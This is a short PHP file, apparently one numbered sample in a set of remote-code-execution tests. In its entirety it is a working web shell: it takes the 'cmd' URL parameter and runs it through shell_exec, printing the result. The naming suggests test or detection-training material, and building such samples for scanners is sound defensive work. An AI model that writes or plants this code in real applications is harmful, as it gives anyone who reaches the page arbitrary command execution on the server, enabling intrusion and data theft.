<?php
// RCE test variation #1001
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>